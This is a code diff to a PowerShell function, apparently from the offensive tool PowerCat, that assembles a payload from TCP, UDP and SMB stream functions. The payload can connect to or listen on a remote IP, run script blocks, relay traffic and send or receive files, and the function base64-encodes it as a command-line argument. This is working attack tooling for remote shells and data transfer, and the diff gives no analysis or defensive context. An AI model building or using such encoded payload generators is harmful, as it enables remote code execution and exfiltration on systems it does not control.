@@ -30,10 +30,6 @@
         [Switch]$Disconnect,
     
         [Parameter()]
-        [Alias('k')]
-        [Switch]$KeepAlive,
-    
-        [Parameter()]
         [Alias('t')]
         [Int]$Timeout = 60,
         
@@ -51,20 +47,23 @@
             $Ipv4 = [regex]"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
             $RemoteIpParam = New-RuntimeParameter -Name RemoteIp -Type String -Mandatory -Position 2 -ValidatePattern $Ipv4 -ParameterDictionary $ParameterDictionary
         }
-        
-        if ($Execute.IsPresent -and $Mode -eq 'Udp') { 
-            $ScriptBlockParam = New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -Mandatory -ParameterDictionary $ParameterDictionary 
-            $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
-        }
-        elseif ($Execute.IsPresent) { 
+
+        if ($Execute.IsPresent) { 
             $ScriptBlockParam = New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -ParameterDictionary $ParameterDictionary 
             $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
         }
+        if ($Execute.IsPresent -and $Listener.IsPresent) { $KeepAliveParam = New-RuntimeParameter -Name KeepAlive -Type Switch -ParameterDictionary $ParameterDictionary }
         return $ParameterDictionary
     }
-
     Begin {
-        $PayloadString = 'function Write-NetworkStream {' + ${function:Write-NetworkStream} + '}'
+        $PayloadString = 'function New-RuntimeParameter {' + ${function:New-RuntimeParameter} + '}' 
+        $PayloadString += 'function Test-Port {' + ${function:Test-Port} + '}' 
+        switch ($Mode) { 
+            'Smb' { $PayloadString += 'function New-SmbStream {' + ${function:New-SmbStream} + '}' }
+            'Tcp' { $PayloadString += 'function New-TcpStream {' + ${function:New-TcpStream} + '}' }
+            'Udp' { $PayloadString += 'function New-UdpStream {' + ${function:New-UdpStream} + '}' }
+        }
+        $PayloadString += 'function Write-NetworkStream {' + ${function:Write-NetworkStream} + '}'
         $PayloadString += 'function Read-NetworkStream {' + ${function:Read-NetworkStream} + '}'
         $PayloadString += 'function Close-NetworkStream {' + ${function:Close-NetworkStream} + '}'
         if ($Listener.IsPresent) { 
@@ -73,7 +72,7 @@
         }
         else { 
             $PayloadString += 'function Connect-PowerCat {' + ${function:Connect-PowerCat} + "}`n"
-            $PayloadString += "Connect-PowerCat $Mode $($ParameterDictionary.Port.Value) $($ParameterDictionary.PipeName.Value) $($ParameterDictionary.RemoteIp.Value)"
+            $PayloadString += "Connect-PowerCat $Mode $($ParameterDictionary.RemoteIp.Value) $($ParameterDictionary.Port.Value) $($ParameterDictionary.PipeName.Value)"
         }
     }
     Process {
@@ -82,24 +81,17 @@
             if ($ParameterDictionary.ScriptBlock.Value) { $PayloadString += " -ScriptBlock $($ParameterDictionary.ScriptBlock.Value)" }
             if ($ParameterDictionary.ArgumentList.Value) { $PayloadString += " -ArgumentList $($ParameterDictionary.ArgumentList.Value)" }
         }
-        elseif ($PSCmdlet.ParameterSetName -eq 'Relay') {
-
-        }
-        elseif ($PSCmdlet.ParameterSetName -eq 'SendFile') {
-
-        }
-        elseif ($PSCmdlet.ParameterSetName -eq 'ReceiveFile') {
-
-        }
-        if ($KeepAlive.IsPresent) { }
-        elseif ($Disconnect.IsPresent) { }
-        if ($PSBoundParameters.Timeout) { }
-        if ($PSBoundParameters.Encoding) { }
+        elseif ($PSCmdlet.ParameterSetName -eq 'Relay') { $PayloadString += " -Relay $Relay" }
+        elseif ($PSCmdlet.ParameterSetName -eq 'SendFile') { $PayloadString += " -SendFile $SendFile" }
+        elseif ($PSCmdlet.ParameterSetName -eq 'ReceiveFile') { $PayloadString += " -ReceiveFile $ReceiveFile" }
+        if ($ParameterDictionary.KeepAlive.IsSet) { $PayloadString += ' -KeepAlive' }
+        elseif ($Disconnect.IsPresent) { $PayloadString += ' -Disconnect' }
+        if ($PSBoundParameters.Timeout) { $PayloadString += " -Timeout $Timeout" }
+        if ($PSBoundParameters.Encoding) { $PayloadString += " -Encoding $Encoding" }
 
         $ScriptBlock = [ScriptBlock]::Create($PayloadString)
 
-        # Base64 encode script so it can be passed as a command-line argument
-        $EncodedPayload = Out-EncodedCommand -NoProfile -NonInteractive -WindowStyle Hidden -ScriptBlock $ScriptBlock
+        Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $ScriptBlock 
     }
     End {}
 }
